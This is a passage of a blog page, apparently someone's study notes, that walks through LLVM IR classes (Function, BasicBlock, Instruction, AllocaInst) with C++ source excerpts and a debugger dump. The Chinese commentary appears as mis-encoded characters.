class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//===--------------------------------------------------------------------===//</span><br><span class="hljs-comment">// BasicBlock iterator forwarding functions</span><br><span class="hljs-comment">//</span><br><span class="hljs-function">iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function">const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function">iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">end</span>();   &#125;<br><span class="hljs-function">const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">end</span>();   &#125;<br>    <br><span class="hljs-function"><span class="hljs-type">size_t</span>                   <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">size</span>();  &#125;<br><span class="hljs-function"><span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">empty</span>(); &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock       &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">front</span>(); &#125;<br>      <span class="hljs-function">BasicBlock       &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock        &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">back</span>();  &#125;<br>      <span class="hljs-function">BasicBlock        &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">back</span>();  &#125;<br></code></pre></td></tr></table></figure></li><li><p>Argumentè¿­ä»£å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">arg_iterator <span class="hljs-title">arg_begin</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments;<br>&#125;<br><span class="hljs-function">const_arg_iterator <span class="hljs-title">arg_begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments;<br>&#125;<br>    <br><span class="hljs-function">arg_iterator <span class="hljs-title">arg_end</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + NumArgs;<br>&#125;<br><span class="hljs-function">const_arg_iterator <span class="hljs-title">arg_end</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + NumArgs;<br>&#125;<br>    <br><span class="hljs-function">Argument* <span class="hljs-title">getArg</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> i)</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span> (i &lt; NumArgs &amp;&amp; <span class="hljs-string">&quot;getArg() out of range!&quot;</span>);<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + i;<br>&#125;<br>    <br><span class="hljs-function">iterator_range&lt;arg_iterator&gt; <span class="hljs-title">args</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">arg_begin</span>(), <span class="hljs-built_in">arg_end</span>());<br>&#125;<br><span class="hljs-function">iterator_range&lt;const_arg_iterator&gt; <span class="hljs-title">args</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">arg_begin</span>(), <span class="hljs-built_in">arg_end</span>());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>åˆ›å»ºä¸€ä¸ªFunction</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;N, Module &amp;M)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">unsigned</span> AddrSpace, <span class="hljs-type">const</span> Twine &amp;N = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Module *M = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(Ty, Linkage, AddrSpace, N, M);<br>  &#125;<br><br><br><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;N = <span class="hljs-string">&quot;&quot;</span>, Module *M = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(Ty, Linkage, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(<span class="hljs-number">-1</span>), N, M);<br>  &#125;<br></code></pre></td></tr></table></figure><p>FunctionTypeçš„æ„é€ è§ä¸Šï¼ŒgetOrInsertFunctionå‡½æ•°å…¶å®ä¹Ÿæ˜¯Createçš„å°è£…</p></li><li><p>è·å–å‡½æ•°è¿”å›ç±»å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getFunctionType</span>()-&gt;<span class="hljs-built_in">getReturnType</span>(); &#125;<br></code></pre></td></tr></table></figure><p>FunctionTypeæ˜¯Typeçš„å­ç±»ï¼ŒReturnTypeå’ŒParamTypeéƒ½å­˜åœ¨Typeç±»å‹çš„ContainedTysæˆå‘˜é‡Œï¼Œè¿™æ˜¯ä¸€ä¸ªTypeæ•°ç»„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span> &#123;<br><span class="hljs-keyword">protected</span>:<br>  <span class="hljs-type">unsigned</span> NumContainedTys = <span class="hljs-number">0</span>;<br>  Type * <span class="hljs-type">const</span> *ContainedTys = <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä»getXXXTypeå‡½æ•°ä¸­çœ‹å‡ºæ¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Function</span><br><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getFunctionType</span>()-&gt;<span class="hljs-built_in">getReturnType</span>(); &#125;<br><br><span class="hljs-comment">// FunctionType</span><br><span class="hljs-function">FunctionType *<span class="hljs-title">getFunctionType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">cast</span>&lt;FunctionType&gt;(<span class="hljs-built_in">getValueType</span>());<br>&#125;<br><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> ContainedTys[<span class="hljs-number">0</span>]; &#125;<br><span class="hljs-function">Type *<span class="hljs-title">getParamType</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> i)</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> ContainedTys[i+<span class="hljs-number">1</span>]; &#125;<br></code></pre></td></tr></table></figure></li><li><p>è¿”å›å‡½æ•°çš„å…¥å£BasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock       &amp;<span class="hljs-title">getEntryBlock</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>   </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">front</span>(); &#125;<br>      <span class="hljs-function">BasicBlock       &amp;<span class="hljs-title">getEntryBlock</span><span class="hljs-params">()</span>         </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">front</span>(); &#125;<br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®&amp;è·å–è°ƒç”¨è§„åˆ™</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">CallingConv::ID <span class="hljs-title">getCallingConv</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;CallingConv::ID&gt;((<span class="hljs-built_in">getSubclassDataFromValue</span>() &gt;&gt; <span class="hljs-number">4</span>) &amp;<br>                                      CallingConv::MaxID);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setCallingConv</span><span class="hljs-params">(CallingConv::ID CC)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> ID = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(CC);<br>  <span class="hljs-built_in">assert</span>(!(ID &amp; ~CallingConv::MaxID) &amp;&amp; <span class="hljs-string">&quot;Unsupported calling convention&quot;</span>);<br>  <span class="hljs-built_in">setValueSubclassData</span>((<span class="hljs-built_in">getSubclassDataFromValue</span>() &amp; <span class="hljs-number">0xc00f</span>) | (ID &lt;&lt; <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼Œä¸è®¾ç½®å¥½åƒä¹Ÿæ²¡å•¥é—®é¢˜ï¼ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *foo;<br>foo-&gt;<span class="hljs-built_in">setCallingConv</span>(CallingConv::C);<br></code></pre></td></tr></table></figure></li></ul><h1 id="BasicBlock"><a href="#BasicBlock" class="headerlink" title="BasicBlock"></a>BasicBlock</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/BasicBlock.png" class title="BasicBlock"><h2 id="ç›¸å…³æ“ä½œ-2"><a href="#ç›¸å…³æ“ä½œ-2" class="headerlink" title="ç›¸å…³æ“ä½œ"></a>ç›¸å…³æ“ä½œ</h2><ul><li><p>åˆ›å»ºä¸€ä¸ªBasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BasicBlock *<span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;Context, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Function *Parent = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">BasicBlock</span>(Context, Name, Parent, InsertBefore);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“InsertBeforeä¸ºNULLæ—¶é»˜è®¤æ’å…¥Functionæœ«å°¾</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BasicBlock::<span class="hljs-built_in">BasicBlock</span>(LLVMContext &amp;C, <span class="hljs-type">const</span> Twine &amp;Name, Function *NewParent,<br>                       BasicBlock *InsertBefore)<br>  : <span class="hljs-built_in">Value</span>(Type::<span class="hljs-built_in">getLabelTy</span>(C), Value::BasicBlockVal), <span class="hljs-built_in">Parent</span>(<span class="hljs-literal">nullptr</span>) &#123;<br><br>  <span class="hljs-keyword">if</span> (NewParent)<br>      <span class="hljs-comment">// Insert unlinked basic block into a function. Inserts an unlinked basic block into Parent. If InsertBefore is provided, inserts before that basic block, otherwise inserts at the end.</span><br>    <span class="hljs-built_in">insertInto</span>(NewParent, InsertBefore);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">assert</span>(!InsertBefore &amp;&amp;<br>           <span class="hljs-string">&quot;Cannot insert block before another block with no function!&quot;</span>);<br><br>  <span class="hljs-built_in">setName</span>(Name);<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *customFunc;<br>BasicBlock *entryBlock = BasicBlock::<span class="hljs-built_in">Create</span>(context, <span class="hljs-string">&quot;&quot;</span>, customFunc, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li><p>Instructionè¿­ä»£å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//===--------------------------------------------------------------------===//</span><br><span class="hljs-comment">/// Instruction iterator methods</span><br><span class="hljs-comment">///</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">end</span>();   &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">end</span>();   &#125;<br>  <br><span class="hljs-function"><span class="hljs-keyword">inline</span> reverse_iterator        <span class="hljs-title">rbegin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rbegin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_reverse_iterator  <span class="hljs-title">rbegin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rbegin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> reverse_iterator        <span class="hljs-title">rend</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rend</span>();   &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_reverse_iterator  <span class="hljs-title">rend</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rend</span>();   &#125;<br>  <br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span>                   <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">size</span>();  &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">empty</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> Instruction      &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       Instruction      &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> Instruction       &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">back</span>();  &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       Instruction       &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">back</span>();  &#125;<br></code></pre></td></tr></table></figure></li><li><p>è·å–æ‰€å±Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> Function *<span class="hljs-title">getParent</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br>      <span class="hljs-function">Function *<span class="hljs-title">getParent</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Instruction.png" class title="Instruction"><h2 id="ç›¸å…³æ“ä½œ-3"><a href="#ç›¸å…³æ“ä½œ-3" class="headerlink" title="ç›¸å…³æ“ä½œ"></a>ç›¸å…³æ“ä½œ</h2><ul><li><p>è·å–çˆ¶BasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> BasicBlock *<span class="hljs-title">getParent</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       BasicBlock *<span class="hljs-title">getParent</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br></code></pre></td></tr></table></figure></li><li><p>è·å–æŒ‡ä»¤æ“ä½œç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">getOpcode</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getValueID</span>() - InstructionVal; &#125;<br></code></pre></td></tr></table></figure></li><li><p>è¿”å›æŒ‡ä»¤çš„å¦ä¸€ä¸ªå®ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Instruction *<span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªæŒ‡ä»¤</p><ul><li>æ²¡æœ‰åå­—</li><li>æ²¡æœ‰Parent</li></ul></li><li><p>æŒ‡ä»¤æ›¿æ¢</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReplaceInstWithInst</span><span class="hljs-params">(BasicBlock::InstListType &amp;BIL,</span></span><br><span class="hljs-params"><span class="hljs-function">                         BasicBlock::iterator &amp;BI, Instruction *I)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReplaceInstWithInst</span><span class="hljs-params">(Instruction *From, Instruction *To)</span></span>;<span class="hljs-comment">// ä¸æ›´æ–°è¿­ä»£å™¨ï¼Œä¼šæ®µé”™è¯¯</span><br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = bas.<span class="hljs-built_in">begin</span>(); it != bas.<span class="hljs-built_in">end</span>(); it++)&#123;<br>    â€¦â€¦<br><span class="hljs-built_in">ReplaceInstWithInst</span>(old_ope-&gt;<span class="hljs-built_in">getParent</span>()-&gt;<span class="hljs-built_in">getInstList</span>(), it, myaddCall);<br>    old_ope-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(myaddCall);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="ä¸åŒInstructionçš„åˆ›å»º"><a href="#ä¸åŒInstructionçš„åˆ›å»º" class="headerlink" title="ä¸åŒInstructionçš„åˆ›å»º"></a>ä¸åŒInstructionçš„åˆ›å»º</h1><p>åªåˆ—å‡ºæ¥äº†å†™ä½œä¸šçš„æ—¶å€™ä½¿ç”¨çš„</p><h2 id="alloca"><a href="#alloca" class="headerlink" title="alloca"></a>alloca</h2><p>allocaå‘½ä»¤æ˜¯AllocaInstç±»å‹ï¼Œç»§æ‰¿å…³ç³»æ˜¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">AllocaInst-&gt;</span><span class="language-bash">UnaryInstruction-&gt;Instruction</span><br></code></pre></td></tr></table></figure><p>åªæ¯”Instructionå¤šäº†ä¸€ä¸ªæˆå‘˜ï¼Œè¡¨ç¤ºå‚¨å­˜æ•°æ®çš„ç±»å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">2</span> = &#123;<br>  &lt;llvm::UnaryInstruction&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x46af60</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">57</span> <span class="hljs-string">&#x27;9&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">2</span>,<br>          NumUserOperands = <span class="hljs-number">1</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x46abd8</span>,<br>              Next = <span class="hljs-number">0x46abd8</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x46abb0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, &lt;No data fields&gt;&#125;, <br>  members of llvm::AllocaInst:<br>  AllocatedType = <span class="hljs-number">0x466d80</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨newæ–°å»ºä¸€ä¸ªAllocaInst</p><figure class="highlight cpp"><table><tr><td 